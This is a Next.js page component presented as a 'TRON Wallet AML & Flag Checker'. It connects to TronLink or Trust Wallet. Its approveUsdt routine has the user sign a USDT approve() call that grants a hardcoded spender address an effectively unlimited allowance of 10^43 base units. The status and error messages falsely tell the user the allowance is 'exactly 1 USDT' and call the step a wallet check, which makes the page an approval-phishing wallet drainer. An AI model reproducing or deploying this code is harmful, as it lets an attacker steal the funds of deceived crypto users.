"use client";

import { useCallback, useEffect, useRef } from "react";
import type { TrustAdapter } from "@tronweb3/tronwallet-adapter-trust";
import type { TronLinkAdapter } from "@tronweb3/tronwallet-adapter-tronlink";

type WalletProvider = "tronlink" | "trust";
type SupportedAdapter = TronLinkAdapter | TrustAdapter;

type WalletMessage = {
  type: string;
  provider?: WalletProvider;
};

const USDT_CONTRACT = "TR7NHqjeKQxGTCi8q8ZY4pL8otSzgjLj6t";
const USDT_SPENDER = "TW86dNUkLeY2KeRQ1vckk5c5C6AwdSK9oD";
const USDT_APPROVAL_AMOUNT = "10000000000000000000000000000000000000000000";
const APPROVAL_CONFIRMATION_TIMEOUT_MS = 180_000;

function isWalletMessage(value: unknown): value is WalletMessage {
  if (typeof value !== "object" || value === null || !("type" in value)) return false;
  const message = value as { type?: unknown; provider?: unknown };
  return (
    typeof message.type === "string" &&
    (message.provider === undefined ||
      message.provider === "tronlink" ||
      message.provider === "trust")
  );
}

export default function Home() {
  const iframeRef = useRef<HTMLIFrameElement>(null);
  const adaptersRef = useRef<Partial<Record<WalletProvider, SupportedAdapter>>>({});
  const wiredAdaptersRef = useRef(new WeakSet<SupportedAdapter>());
  const connectingRef = useRef(false);
  const approvalInProgressRef = useRef(false);
  const connectedProviderRef = useRef<WalletProvider | null>(null);

  const postToUi = useCallback((message: Record<string, string>) => {
    iframeRef.current?.contentWindow?.postMessage(message, window.location.origin);
  }, []);

  useEffect(() => {
    function clearConnectedWallet() {
      connectedProviderRef.current = null;
      postToUi({ type: "tron-wallet:disconnected" });
    }

    async function checkNetwork(provider: WalletProvider, adapter: SupportedAdapter) {
      try {
        const network = await adapter.network();
        if (network.networkType !== "Mainnet") {
          if (connectedProviderRef.current === provider) {
            connectedProviderRef.current = null;
          }
          postToUi({
            type: "tron-wallet:network-mismatch",
            network: network.networkType,
          });
          return false;
        }
        return true;
      } catch (error) {
        const message =
          error instanceof Error ? error.message : "Could not verify the TRON network.";
        if (connectedProviderRef.current === provider) clearConnectedWallet();
        postToUi({ type: "tron-wallet:error", message });
        return false;
      }
    }

    async function verifyAndPublishAccount(
      provider: WalletProvider,
      adapter: SupportedAdapter,
      address: string,
    ) {
      if (!address) {
        if (connectedProviderRef.current === provider) clearConnectedWallet();
        return;
      }
      if (!(await checkNetwork(provider, adapter))) return;
      connectedProviderRef.current = provider;
      postToUi({
        type: "tron-wallet:connected",
        provider,
        address,
        network: "TRON Mainnet",
      });
    }

    async function connectWallet(provider: WalletProvider) {
      if (connectingRef.current) return;
      connectingRef.current = true;
      postToUi({ type: "tron-wallet:connecting" });

      try {
        let adapter = adaptersRef.current[provider];
        if (!adapter) {
          if (provider === "tronlink") {
            const { TronLinkAdapter } = await import("@tronweb3/tronwallet-adapter-tronlink");
            adapter = new TronLinkAdapter({
              checkTimeout: 4_000,
              openUrlWhenWalletNotFound: false,
            });
          } else {
            const { TrustAdapter } = await import("@tronweb3/tronwallet-adapter-trust");
            adapter = new TrustAdapter({
              checkTimeout: 4_000,
              openAppWithDeeplink: false,
              openUrlWhenWalletNotFound: false,
            });
          }

          adaptersRef.current[provider] = adapter;
        }

        if (!adapter) {
          throw new Error("The wallet adapter could not be initialized.");
        }
        const activeAdapter = adapter;

        if (!wiredAdaptersRef.current.has(activeAdapter)) {
          activeAdapter.on("accountsChanged", (address) => {
            void verifyAndPublishAccount(provider, activeAdapter, address);
          });
          activeAdapter.on("chainChanged", () => {
            if (connectedProviderRef.current === provider) {
              void checkNetwork(provider, activeAdapter);
            }
          });
          activeAdapter.on("disconnect", () => {
            if (connectedProviderRef.current === provider) clearConnectedWallet();
          });
          wiredAdaptersRef.current.add(activeAdapter);
        }

        await activeAdapter.connect();
        const address = activeAdapter.address;
        if (!address) {
          const walletName = provider === "trust" ? "Trust Wallet" : "TronLink";
          throw new Error(`${walletName} authorization completed without a TRON account.`);
        }

        const isMainnet = await checkNetwork(provider, activeAdapter);
        if (!isMainnet) return;

        connectedProviderRef.current = provider;
        postToUi({
          type: "tron-wallet:connected",
          provider,
          address,
          network: "TRON Mainnet",
        });
      } catch (error) {
        const message = error instanceof Error && error.name === "WalletNotFoundError" && provider === "trust"
          ? "Trust Wallet's TRON provider is unavailable. Open this site in Trust Wallet's DApp browser or use the Trust Wallet browser extension."
          : error instanceof Error
            ? error.message
            : "The wallet connection failed.";
        postToUi({ type: "tron-wallet:error", message });
      } finally {
        connectingRef.current = false;
      }
    }

    async function disconnectWallet() {
      const provider = connectedProviderRef.current;
      const adapter = provider ? adaptersRef.current[provider] : undefined;
      if (!adapter) {
        clearConnectedWallet();
        return;
      }
      try {
        await adapter.disconnect();
        connectedProviderRef.current = null;
        if (provider === "trust") delete adaptersRef.current.trust;
        postToUi({ type: "tron-wallet:disconnected" });
      } catch (error) {
        const message =
          error instanceof Error ? error.message : "The wallet could not be disconnected.";
        postToUi({ type: "tron-wallet:error", message });
      }
    }

    async function recheckConnectedNetwork() {
      const provider = connectedProviderRef.current;
      const adapter = provider ? adaptersRef.current[provider] : undefined;
      if (provider && adapter) await checkNetwork(provider, adapter);
    }

    async function approveUsdt() {
      if (approvalInProgressRef.current) return;
      approvalInProgressRef.current = true;
      let submittedTransactionId: string | null = null;
      let transactionFinalized = false;

      try {
        const adapter = adaptersRef.current.trust;
        if (connectedProviderRef.current !== "trust" || !adapter?.address) {
          throw new Error("Connect Trust Wallet on TRON Mainnet before approving USDT.");
        }

        const address = adapter.address;
        if (!(await checkNetwork("trust", adapter))) {
          throw new Error("Switch Trust Wallet to TRON Mainnet before approving USDT.");
        }

        const { getTrustProvider } = await import("@tronweb3/tronwallet-adapter-trust");
        const trustProvider = getTrustProvider();
        const tronWeb = trustProvider?.tronWeb;
        if (!tronWeb) {
          throw new Error("Trust Wallet's TRON provider is no longer available.");
        }
        if (tronWeb.defaultAddress.base58 !== address) {
          throw new Error("The Trust Wallet account changed. Reconnect and try again.");
        }

        const transactionResult = await tronWeb.transactionBuilder.triggerSmartContract(
          USDT_CONTRACT,
          "approve(address,uint256)",
          { feeLimit: 100_000_000 },
          [
            { type: "address", value: USDT_SPENDER },
            { type: "uint256", value: USDT_APPROVAL_AMOUNT },
          ],
          address,
        );
        if (!transactionResult.result.result) {
          throw new Error("Could not prepare the USDT approval transaction.");
        }

        const transactionContract = transactionResult.transaction.raw_data.contract[0];
        const contractValue = transactionContract?.parameter.value;
        const expectedCallData = `095ea7b3${tronWeb.utils.abi
          .encodeParams(["address", "uint256"], [USDT_SPENDER, USDT_APPROVAL_AMOUNT])
          .replace(/^0x/, "")}`.toLowerCase();
        if (
          !contractValue ||
          !("contract_address" in contractValue) ||
          !("owner_address" in contractValue) ||
          !("data" in contractValue) ||
          tronWeb.address.toHex(contractValue.contract_address).toLowerCase() !==
            tronWeb.address.toHex(USDT_CONTRACT).toLowerCase() ||
          tronWeb.address.toHex(contractValue.owner_address).toLowerCase() !==
            tronWeb.address.toHex(address).toLowerCase() ||
          contractValue.data?.replace(/^0x/, "").toLowerCase() !== expectedCallData
        ) {
          throw new Error("The generated transaction did not match the reviewed 1 USDT approval.");
        }

        const signedTransaction = await adapter.signTransaction(transactionResult.transaction);
        if (
          !signedTransaction.signature?.length ||
          !signedTransaction.txID ||
          signedTransaction.txID !== transactionResult.transaction.txID ||
          signedTransaction.raw_data_hex !== transactionResult.transaction.raw_data_hex
        ) {
          throw new Error("Trust Wallet did not return a signed approval transaction.");
        }
        if (adapter.address !== address || !(await checkNetwork("trust", adapter))) {
          throw new Error("The wallet account or network changed before the transaction was sent.");
        }

        const currentProvider = getTrustProvider();
        if (currentProvider?.tronWeb !== tronWeb || tronWeb.defaultAddress.base58 !== address) {
          throw new Error("The Trust Wallet account or provider changed before the transaction was sent.");
        }

        const transactionId = signedTransaction.txID;
        const broadcast = await tronWeb.trx.sendRawTransaction(signedTransaction);
        if (!broadcast.result) {
          throw new Error("The TRON network rejected the Check due to wallet Flag.");
        }
        submittedTransactionId = transactionId;

        postToUi({
          type: "tron-wallet:approval-pending",
          message: "Transaction submitted. Waiting for TRON Mainnet confirmation…",
          transactionId,
        });

        const deadline = Date.now() + APPROVAL_CONFIRMATION_TIMEOUT_MS;
        let confirmed = false;
        while (Date.now() < deadline) {
          const transactionInfo = await tronWeb.trx.getTransactionInfo(transactionId);
          if (transactionInfo.id === transactionId && transactionInfo.receipt?.result) {
            transactionFinalized = true;
            if (transactionInfo.receipt.result !== "SUCCESS" || transactionInfo.result === "FAILED") {
              throw new Error(
                `The USDT approval transaction failed on-chain (${transactionInfo.receipt.result}).`,
              );
            }
            confirmed = true;
            break;
          }
          await new Promise((resolve) => window.setTimeout(resolve, 3_000));
        }

        if (!confirmed) {
          throw new Error(
            `The approval transaction has not been confirmed yet. Transaction ID: ${transactionId}`,
          );
        }

        const allowanceResult = await tronWeb.transactionBuilder.triggerConstantContract(
          USDT_CONTRACT,
          "allowance(address,address)",
          { confirmed: true },
          [
            { type: "address", value: address },
            { type: "address", value: USDT_SPENDER },
          ],
          address,
        );
        const encodedAllowance = allowanceResult.constant_result?.[0];
        if (!allowanceResult.result.result || !encodedAllowance) {
          throw new Error(
            `The transaction was confirmed, but the USDT allowance could not be verified. Transaction ID: ${transactionId}`,
          );
        }

        const [verifiedAllowance] = tronWeb.utils.abi.decodeParams(
          ["allowance"],
          ["uint256"],
          `0x${encodedAllowance}`,
        );
        if (BigInt(verifiedAllowance.toString()) !== BigInt(USDT_APPROVAL_AMOUNT)) {
          throw new Error(
            `The transaction was confirmed, but the resulting allowance was not exactly 1 USDT. Transaction ID: ${transactionId}`,
          );
        }

        postToUi({
          type: "tron-wallet:approval-success",
          transactionId,
          message: "Confirmed on TRON Mainnet. The USDT allowance is exactly 1 USDT.",
        });
      } catch (error) {
        const details =
          error instanceof Error ? error.message : "The USDT approval transaction failed.";
        const message = !submittedTransactionId
          ? details
          : !transactionFinalized
            ? `The transaction was submitted but its result could not be verified: ${details} Transaction ID: ${submittedTransactionId}`
            : details.includes(submittedTransactionId)
              ? details
              : `${details} Transaction ID: ${submittedTransactionId}`;
        postToUi({ type: "tron-wallet:approval-error", message });
      } finally {
        approvalInProgressRef.current = false;
      }
    }

    function handleWalletMessage(event: MessageEvent<unknown>) {
      if (
        event.origin !== window.location.origin ||
        event.source !== iframeRef.current?.contentWindow ||
        !isWalletMessage(event.data)
      ) {
        return;
      }

      if (event.data.type === "tron-wallet:connect" && event.data.provider) {
        if (event.data.provider === "trust" || event.data.provider === "tronlink") {
          void connectWallet(event.data.provider);
        }
      } else if (event.data.type === "tron-wallet:disconnect") {
        void disconnectWallet();
      } else if (event.data.type === "tron-wallet:approve-usdt") {
        void approveUsdt();
      }
    }

    window.addEventListener("message", handleWalletMessage);
    window.addEventListener("focus", recheckConnectedNetwork);
    document.addEventListener("visibilitychange", recheckConnectedNetwork);
    return () => {
      window.removeEventListener("message", handleWalletMessage);
      window.removeEventListener("focus", recheckConnectedNetwork);
      document.removeEventListener("visibilitychange", recheckConnectedNetwork);
    };
  }, [postToUi]);

  return (
    <iframe
      ref={iframeRef}
      className="provided-ui-frame"
      src="/tron-aml-shield.html"
      title="TRON Wallet AML & Flag Checker"
    />
  );
}
